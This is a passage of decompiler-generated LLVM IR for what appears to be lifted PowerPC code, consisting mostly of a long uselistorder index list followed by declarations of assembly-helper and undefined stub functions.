306, 307, 2255, 2256, 2257, 794, 795, 2258, 2259, 2260, 308, 309, 310, 2261, 2262, 2263, 796, 797, 2264, 2265, 2266, 3272, 3273, 1959, 2267, 2268, 1960, 591, 3271, 2288, 2289, 311, 2290, 2291, 2292, 798, 799, 2293, 111, 476, 241, 2294, 2295, 2296, 2297, 2298, 6, 800, 2299, 2300, 2301, 2302, 2303, 2304, 2305, 801, 312, 2312, 2313, 2314, 3532, 477, 313, 802, 3529, 3530, 2315, 173, 192, 2316, 2323, 193, 444, 478, 2324, 2325, 314, 2326, 112, 113, 479, 2327, 2328, 2329, 2330, 2331, 316, 3531, 315, 480, 317, 2332, 2333, 2334, 2335, 318, 3264, 7, 606, 2339, 2340, 8, 2341, 2342, 2343, 9, 3274, 3275, 3276, 3277, 3278, 803, 319, 320, 2344, 2345, 10, 2346, 2347, 2348, 270, 3279, 804, 3280, 607, 3282, 2006, 2007, 2008, 2009, 2010, 2011, 608, 597, 2012, 2013, 2014, 2015, 2016, 2017, 2020, 2019, 2021, 2022, 2023, 2024, 609, 2025, 2026, 2027, 805, 2028, 2018, 2029, 2030, 2031, 2032, 2033, 3283, 3284, 3285, 610, 3286, 611, 3287, 3288, 3289, 3290, 3291, 3292, 11, 322, 321, 806, 2349, 2350, 2351, 2352, 2353, 2356, 2357, 2354, 2355, 2358, 807, 2359, 2360, 2361, 2362, 2363, 2364, 2365, 3533, 3534, 12, 323, 612, 2802, 2803, 2804, 13, 3315, 3316, 482, 3318, 3317, 174, 14, 3319, 481, 15, 3320, 484, 3321, 175, 16, 3322, 483, 3136, 3137, 194, 3138, 3139, 3140, 3141, 3142, 3082, 3083, 3084, 808, 3085, 3086, 3087, 3323, 3324, 3325, 3326, 3327, 809, 3328, 3329, 3330, 3331, 3332, 3333, 3334, 3335, 3336, 3337, 3338, 3339, 3340, 324, 325, 3341, 3342, 3343, 3344, 3345, 3346, 3347, 3348, 3349, 114, 3350, 810, 233, 3351, 3352, 3353, 3354, 3355, 326, 3356, 3357, 3358, 3359, 3360, 3361, 3362, 3363, 3364, 3365, 327, 3366, 3367, 3368, 753, 754, 3369, 3370, 3371, 93, 17, 3372, 3373, 3374, 3375, 3376, 3377, 3378, 3379, 3380, 3381, 3382, 3383, 3384, 3385, 3386, 3387, 3388, 3389, 3390, 3391, 242, 3568, 3569, 3570, 3572, 3571, 18, 485, 19, 2660, 3394, 3393, 486, 3392, 243, 3395, 3396, 3397, 328, 3398, 3573, 3574, 613, 3575, 3576, 3577, 3578, 2949, 2661, 2366, 3510, 3496, 614, 3579, 3535, 3552, 3553, 811, 3567, 812, 813, 814, 815, 816, 817, 3694, 3695, 818, 3701, 3723, 487, 3724, 3733, 819, 3715, 20, 3580, 3581, 615, 329, 2950, 2951, 820, 616, 821, 2952, 2953, 197, 198, 2954, 2955, 2956, 822, 2957, 2958, 2959, 195, 196, 2960, 2961, 2962, 2963, 2964, 2965, 2966, 2967, 330, 331, 3582, 3583, 3666, 2968, 2969, 2970, 2971, 2972, 332, 2973, 2974, 2975, 755, 2976, 2887, 823, 2977, 825, 824, 617, 826, 827, 828, 2979, 829, 2984, 830, 2367, 2368, 2369, 333, 2370, 334, 3226, 3227, 488, 244, 271, 3228, 3229, 21, 3232, 2371, 2372, 335, 2373, 2374, 2375, 3599, 3601, 115, 3602, 199, 3603, 3600, 3597, 3598, 22, 3538, 3536, 3537, 489, 3539, 3540, 3604, 3605, 831, 3622, 3541, 3542, 3550, 3551, 336, 3543, 3544, 3545, 3546, 3547, 3548, 3549, 23, 24, 1961, 2980, 2981, 2982, 200, 201, 2983, 25, 337, 2549, 619, 618, 2550, 26, 27, 2858, 3511, 3512, 338, 2376, 2377, 2378, 832, 2379, 2380, 834, 835, 2381, 2382, 833, 2383, 2384, 2385, 2386, 2387, 2388, 2389, 2390, 2391, 2392, 836, 2393, 837, 2394, 2395, 756, 757, 838, 3143, 3144, 490, 3145, 3146, 3147, 3148, 3154, 3155, 3156, 3157, 339, 3158, 3159, 3160, 2730, 620, 839, 28, 3161, 3162, 3163, 341, 3164, 340, 3165, 342, 343, 2396, 2397, 2398, 2399, 2400, 2401, 2402, 2403, 2404, 344, 491, 2406, 2405, 345, 2407, 2408, 347, 346, 2409, 2410, 2411, 2412, 2413, 349, 348, 2414, 2415, 840, 2416, 350, 3107, 3108, 3109, 3110, 3116, 3111, 205, 3117, 3118, 3112, 3113, 3114, 202, 203, 204, 3119, 3120, 116, 117, 118, 579, 3122, 351, 3121, 841, 3123, 3124, 3125, 3126, 353, 2888, 2889, 2890, 2891, 2892, 2893, 2894, 2895, 29, 2908, 2896, 493, 2897, 2898, 2899, 2900, 2901, 2902, 2903, 2904, 2905, 842, 2906, 2907, 492, 2909, 2910, 2911, 758, 2912, 2913, 2914, 2915, 2916, 2917, 2918, 2919, 2920, 2921, 2922, 352, 2923, 2924, 2925, 843, 30, 2926, 494, 2034, 2055, 2040, 2041, 848, 2035, 354, 2036, 2037, 2038, 849, 2039, 206, 496, 2042, 355, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050, 2051, 850, 2052, 2053, 2054, 495, 2056, 2057, 2058, 2059, 2060, 2061, 2062, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 2070, 2071, 235, 2075, 119, 847, 2072, 2073, 2074, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 356, 357, 358, 2087, 2091, 359, 845, 2088, 2089, 2090, 2092, 846, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100, 2101, 2102, 2103, 2104, 2105, 2106, 2107, 2108, 2109, 2110, 2111, 2112, 2113, 2114, 2115, 2116, 2117, 2118, 2119, 2120, 2121, 2122, 844, 2123, 2124, 2125, 2126, 2127, 2128, 2129, 2130, 2131, 2132, 2133, 2134, 2135, 2136, 2137, 2138, 2139, 2140, 2141, 2142, 2143, 2144, 2145, 2146, 2147, 360, 2148, 2149, 2150, 851, 2151, 2152, 2153, 2154, 2155, 2156, 3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710, 3711, 31, 361, 3076, 32, 2724, 362, 363, 3399, 3400, 94, 95, 621, 96, 3401, 497, 33, 2705, 2706, 2707, 207, 3402, 3403, 498, 852, 3404, 3149, 3150, 3151, 3152, 3153, 3166, 365, 364, 3167, 3405, 3406, 499, 3078, 34, 231, 3115, 500, 3725, 3726, 3727, 3728, 3729, 3730, 3731, 3732, 3716, 3717, 3718, 208, 3719, 3720, 3721, 3722, 366, 3407, 3408, 3409, 3410, 3411, 3412, 3168, 3169, 3170, 3171, 3172, 3173, 367, 3088, 3174, 3175, 3176, 3177, 3178, 3183, 3179, 3180, 3181, 3182, 501, 3184, 3185, 3186, 35, 209, 3187, 3188, 3089, 2583, 2584, 3413, 3414, 245, 3415, 3416, 3417, 3418, 3419, 598, 3420, 3421, 3422, 368, 3423, 3424, 3425, 3426, 3427, 369, 3428, 3429, 3430, 3431, 3432, 3433, 3434, 370, 3435, 3436, 3437, 3438, 3439, 3440, 3441, 3442, 3443, 3444, 120, 445, 446, 502, 3445, 3446, 371, 3447, 853, 3448, 3449, 3450, 3453, 376, 372, 3451, 3452, 855, 3454, 3455, 3456, 3458, 377, 3459, 36, 37, 378, 379, 373, 374, 3460, 3461, 375, 3462, 3463, 3464, 3465, 3466, 3467, 3468, 3469, 3470, 854, 3471, 3472, 3473, 3474, 3475, 3476, 3477, 3478, 3479, 3480, 1962, 3481, 3482, 97, 3484, 210, 246, 380, 856, 3487, 759, 3488, 3483, 3485, 3486, 3489, 3490, 381, 2157, 2158, 234, 176, 226, 3457, 503, 3491, 3492, 3493, 3494, 3584, 3586, 3585, 505, 382, 3596, 3587, 504, 622, 3714, 3189, 3190, 3191, 383, 3192, 3193, 3194, 3195, 3196, 3197, 3198, 3199, 3200, 857, 3201, 3202, 3203, 3204, 3205, 3206, 623, 624, 384, 626, 2662, 506, 2663, 2664, 89, 2665, 2666, 625, 2667, 858, 2668, 2669, 2670, 599, 3241, 3242, 2642, 2643, 2644, 2645, 3495, 859, 3207, 3208, 3209, 3210, 3211, 3212, 3213, 3623, 860, 861, 2978, 862, 863, 3230, 3667, 3668, 3669, 2559, 2859, 3222, 3606, 2537, 2543, 2544, 2534, 2538, 3071, 3105, 2860, 2417, 385, 2418, 3696, 386, 3697, 3607, 2492, 2419, 2420, 2650, 2462, 2463, 864, 2464, 98, 3300, 3301, 3670, 3281, 2861, 2698, 3251, 2862, 3700, 2738, 2421, 3233, 3295, 3624, 3698, 3699, 2863, 865, 2864, 2865, 88, 87, 3712, 3713, 866, 2422, 628, 867, 627, 868, 2423, 632, 869, 630, 629, 631, 3671, 3672, 507, 3673, 3674, 3675, 3676, 3677, 3678, 3679, 3680, 3681, 38, 870, 3625, 3626, 3627, 3628, 3629, 3630, 3631, 3632, 177, 3635, 3633, 3634, 121, 508, 3636, 3637, 3638, 3639, 388, 2468, 2469, 2470, 247, 2471, 2472, 387, 2474, 2473, 2475, 871, 2476, 2477, 2478, 248, 3682, 3684, 3683, 3685, 3608, 3616, 3617, 872, 3614, 178, 634, 3613, 389, 633, 3615, 390, 391, 2424, 2425, 2426, 873, 3640, 3641, 3645, 3646, 394, 3647, 122, 874, 3642, 3643, 3644, 393, 392, 509, 39, 876, 2427, 875, 2428, 2429, 2432, 2430, 2431, 396, 395, 510, 511, 2433, 2434, 2435, 2436, 40, 878, 2437, 397, 2438, 877, 2439, 2440, 2159, 2160, 399, 398, 2441, 2442, 400, 3522, 401, 3523, 3524, 402, 3513, 3514, 3515, 3516, 403, 3517, 3518, 3519, 2161, 2162, 404, 2443, 2444, 2445, 405, 2446, 880, 879, 2447, 2450, 881, 2451, 2452, 41, 882, 883, 2453, 2454, 408, 407, 2456, 406, 2457, 2458, 2459, 2460, 409, 2461, 42, 2455, 43, 410, 2448, 2449, 884, 211, 885, 2465, 123, 124, 125, 2467, 2466, 212, 2479, 2480, 887, 2481, 2482, 886, 2483, 2484, 2485, 2486, 2487, 3588, 3591, 3592, 3595, 888, 44, 3556, 889, 3558, 3559, 890, 3565, 3566, 3686, 892, 3687, 891, 3688, 3689, 3690, 3691, 411, 894, 3618, 3619, 893, 3620, 3621, 412, 895, 45, 1963, 46, 896, 47, 413, 48, 49, 414, 2488, 2489, 2490, 50, 3235, 897, 3236, 51, 3590, 3589, 213, 52, 249, 3594, 3593, 214, 2491, 1967, 899, 1968, 1969, 1970, 1971, 1972, 1973, 1974, 1975, 1976, 1977, 1978, 1979, 1980, 1981, 1982, 898, 635, 1983, 636, 1984, 1985, 1986, 1987, 1988, 1989, 1990, 1991, 1992, 1993, 1994, 900, 2501, 2502, 901, 2493, 902, 2504, 903, 2505, 2506, 2500, 904, 2494, 215, 416, 415, 2495, 2496, 2497, 513, 2498, 512, 905, 2499, 2163, 2164, 2165, 906, 2503, 907, 2507, 3237, 514, 417, 2508, 2509, 2510, 2511, 2512, 1964, 908, 418, 3648, 3649, 909, 910, 3650, 3651, 3653, 3654, 911, 3655, 3656, 3657, 3658, 3661, 3652, 53, 912, 2513, 2514, 419, 3560, 913, 914, 3561, 3562, 3564, 420, 2515, 916, 515, 915, 2516, 2519, 2520, 917, 2521, 2522, 2523, 54, 3554, 918, 516, 919, 3555, 3563, 55, 1965, 56, 920, 57, 58, 90, 1966, 59, 921, 3234, 421, 2517, 2518, 922, 216, 60, 3557, 3692, 923, 3693, 3662, 3663, 3664, 3665, 3659, 3660, 422, 2524, 2525, 2526, 2527, 760, 761, 762, 2528, 2529, 2530, 2531, 2532, 2533, 423, 3609, 3610, 3611, 3612, 424, 61, 425, 62, 2535, 63, 426, 64, 65, 66, 67, 427, 428, 99, 100, 2536, 68, 429, 69, 430, 70, 431, 71, 432, 433, 2539, 434, 2540, 2541, 2542, 2545, 2546, 2547, 2166, 2167, 924, 2168, 2866, 637, 2867, 925, 435, 2868, 2869, 2870, 2871, 2872, 2873, 2874, 2880, 926, 927, 928, 929, 930, 931, 932, 2875, 517, 2876, 2877, 2878, 2879, 638, 933, 934, 935, 936, 937, 938, 939, 941, 942, 940, 2548, 943, 639, 944, 2551, 945, 2552, 2553, 105, 946, 436, 2554, 72, 73, 2555, 1289, 1290, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 437, 974, 2558, 975, 976, 438, 3238, 439, 3239, 518, 2556, 2557, 74, 978, 977, 982, 2560, 2561, 2562, 2563, 217, 218, 76, 520, 75, 521, 519, 983, 2564, 101, 2565, 126, 447, 980, 981, 127, 448, 641, 640, 979, 522, 984, 985, 2566, 2567, 2568, 128, 449, 986, 2569, 440, 988, 989, 647, 646, 642, 643, 644, 645, 2570, 987, 219, 990, 991, 2571, 2572, 2573, 992, 2574, 2575, 2576, 993, 2577, 2578, 250, 129, 77, 251, 2579, 252, 130, 528, 527, 526, 2580, 2581, 253, 131, 525, 524, 523, 2582, 2585, 254, 132, 544, 255, 133, 134, 543, 542, 450, 2587, 2586, 541, 2588, 2589, 2590, 2592, 2591, 540, 2593, 2594, 2595, 2597, 2596, 539, 2598, 2599, 2600, 2602, 2601, 538, 2603, 2604, 2605, 2607, 2606, 537, 2608, 2609, 2610, 2612, 2611, 536, 2613, 2614, 2615, 2617, 2616, 535, 2618, 2619, 2620, 2622, 2621, 534, 2623, 2624, 2625, 2627, 2626, 533, 2628, 2629, 2630, 2632, 2631, 532, 2633, 2634, 2635, 2636, 2637, 256, 135, 531, 2638, 2639, 257, 136, 530, 258, 137, 529, 2640, 259, 227, 2641, 138, 451, 994, 2646, 2648, 545, 2647, 452, 2649, 2651, 547, 995, 2652, 2653, 546, 996, 2654, 2655, 2656, 140, 139, 78, 2657, 997, 2658, 2659, 1000, 2671, 2672, 551, 998, 2673, 2674, 550, 999, 2675, 2676, 549, 1001, 2677, 2678, 548, 1002, 580, 2679, 1004, 1005, 2680, 2681, 103, 104, 2682, 2683, 2684, 1003, 2685, 2686, 79, 552, 2687, 1006, 2688, 2689, 2690, 2691, 2692, 2693, 2694, 2695, 2696, 141, 453, 2697, 80, 1007, 1008, 1995, 1996, 1009, 2699, 142, 2700, 143, 454, 2701, 2702, 2703, 1010, 1011, 2704, 763, 648, 649, 650, 651, 2715, 2709, 2711, 2712, 2713, 1013, 2714, 1014, 653, 652, 1012, 220, 2708, 2710, 144, 260, 554, 553, 81, 82, 654, 655, 656, 657, 2716, 1016, 2717, 658, 659, 1015, 221, 2718, 2719, 1017, 261, 228, 2725, 555, 455, 2726, 660, 2720, 2721, 1018, 2722, 1019, 2723, 764, 1021, 2727, 662, 661, 1020, 222, 1022, 2728, 2729, 2731, 1029, 2732, 666, 665, 1026, 1025, 223, 2733, 664, 663, 1024, 1023, 557, 1027, 1028, 145, 456, 556, 1030, 2734, 2735, 2736, 2737, 1035, 2739, 668, 667, 1032, 1031, 224, 1033, 1034, 146, 457, 558, 1036, 2740, 2741, 2742, 2743, 147, 229, 1038, 2744, 2746, 1037, 1039, 2745, 559, 2747, 2748, 441, 1040, 2749, 561, 2750, 560, 458, 1041, 669, 670, 671, 2751, 148, 562, 2752, 2753, 2754, 262, 263, 1043, 674, 672, 1044, 2761, 1042, 2755, 2756, 2757, 2758, 2759, 2760, 563, 2762, 2763, 2764, 2765, 1045, 2766, 673, 2767, 2768, 2769, 2770, 2771, 1046, 264, 677, 675, 676, 1047, 1048, 2783, 265, 149, 581, 564, 680, 681, 2772, 2773, 2774, 2775, 565, 678, 679, 682, 2776, 2777, 2778, 567, 150, 266, 267, 566, 2780, 2781, 2782, 765, 268, 151, 2779, 2784, 766, 2785, 1049, 152, 230, 1051, 2786, 2788, 1050, 1052, 2787, 568, 2789, 2790, 683, 1053, 1054, 685, 684, 2791, 1055, 1056, 1057, 1058, 153, 2995, 688, 1059, 689, 2792, 2793, 2794, 1060, 687, 1061, 1062, 2795, 686, 2796, 2797, 2798, 1063, 154, 459, 1064, 2799, 690, 1066, 691, 1067, 582, 2811, 1065, 2805, 2806, 2807, 2808, 2809, 2810, 570, 2812, 2813, 2814, 2815, 2816, 2817, 2818, 2819, 2820, 2821, 2822, 1068, 2823, 2824, 569, 2825, 1069, 692, 1070, 694, 2826, 693, 1071, 2827, 2828, 2829, 2830, 2831, 1072, 2832, 2833, 442, 571, 2834, 1073, 695, 1074, 697, 696, 2835, 2836, 2837, 1075, 698, 1081, 1082, 1080, 2838, 699, 700, 155, 460, 2841, 583, 2839, 1076, 1077, 1078, 1079, 2840, 1083, 1084, 2842, 1085, 1086, 1087, 2843, 701, 703, 1088, 1089, 702, 2844, 1090, 2845, 704, 1096, 1097, 1095, 2846, 705, 706, 156, 461, 2849, 584, 2847, 1091, 1092, 1093, 1094, 2848, 1098, 1099, 2850, 1100, 1101, 1102, 2851, 707, 709, 1103, 1104, 708, 2852, 1105, 1106, 2853, 710, 1108, 1109, 1107, 2854, 711, 712, 157, 462, 1110, 1111, 2855, 1112, 713, 715, 1113, 1114, 714, 2856, 1115, 2857, 716, 1117, 1118, 1116, 2881, 717, 718, 158, 463, 1119, 1120, 2882, 1121, 719, 721, 1122, 1123, 720, 2883, 1124, 2884, 2885, 2886, 722, 1125, 724, 2927, 723, 1126, 2928, 1127, 1128, 1134, 1133, 2929, 159, 464, 2932, 585, 2930, 1129, 1130, 1131, 1132, 2931, 1135, 1136, 2933, 1137, 1138, 2934, 725, 727, 1139, 1140, 726, 2935, 1141, 1142, 1143, 572, 1144, 2936, 1145, 1147, 1146, 2937, 160, 465, 1148, 1149, 2938, 1150, 1151, 2939, 729, 1152, 728, 2940, 1153, 1159, 1158, 2941, 161, 466, 2944, 586, 2942, 1154, 1155, 1156, 1157, 2943, 1160, 1161, 2945, 1162, 1163, 2946, 730, 732, 1164, 1165, 731, 2947, 1166, 2948, 162, 467, 1167, 2985, 2986, 733, 2987, 2988, 1168, 2989, 2990, 1169, 1170, 1171, 1172, 2991, 589, 2992, 574, 573, 83, 2993, 2994, 737, 575, 2996, 734, 735, 736, 2997, 2998, 2999, 3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 1173, 3009, 738, 739, 3010, 576, 3011, 3012, 163, 164, 84, 3013, 1175, 165, 468, 469, 166, 85, 1174, 3014, 3015, 1176, 3214, 578, 1177, 3215, 3216, 577, 1178, 3217, 3218, 168, 167, 86, 3219, 1179, 3220, 236, 237, 169, 3221, 443, 1181, 3223, 102, 740, 741, 1180, 225, 3224, 3225, 1182, 767, 170, 470, 3231, 1183, 590, 171, 3240, 3243, 3244, 768, 3245, 3246, 238, 239, 172, 3734, 3735, 3736, 3247, 2169, 2170, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1536, 1537, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861, 1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 1893, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 1937, 1938, 1939, 1940, 1941, 1942, 1943, 3737, 3738, 3739, 3740, 3741, 3742, 3743, 3744, 3745, 3746, 3747, 3748, 3749, 3750, 3751, 3752, 3753, 3754, 3755, 3756, 3757, 3758, 3759, 3760, 3761, 3762, 3763, 3764, 3765 }
  uselistorder i32* @lr, {}
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %3 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %2 @__asm_crandc(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
